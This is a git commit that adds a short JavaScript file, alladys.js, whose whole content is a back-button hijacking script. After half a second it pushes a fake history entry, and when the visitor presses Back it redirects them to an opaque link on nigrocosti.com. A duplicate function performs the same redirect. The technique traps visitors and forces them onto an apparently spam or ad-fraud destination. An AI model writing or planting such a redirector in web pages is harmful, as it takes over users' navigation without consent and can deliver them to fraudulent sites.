6794d9daa3f9000727189f732440d9e275922281
mmainomi <akparawa247@gmail.com>
2025-04-02 14:46:39 -0700

    Create alladys.js

---
+++ alladys.js
@@ -0,0 +1,11 @@
+window.onhashchange=function(){jp();};
+    function hh() {history.pushState(history.length+1, "message", "#"+new Date().getTime());}
+    function jp() {
+        fh();}
+    setTimeout('hh();', 500);
+    function fh(){
+        location.href="https://nigrocosti.com/bH3iV/0CP.3cpWvzbjmPVMJIZkD_0J2qMuTmcZ5CNGjEYlw/LgTOY-x_NxzGkT2ENUjTER";
+    }
+    function goon(){
+        location.href="https://nigrocosti.com/bH3iV/0CP.3cpWvzbjmPVMJIZkD_0J2qMuTmcZ5CNGjEYlw/LgTOY-x_NxzGkT2ENUjTER";
+    }
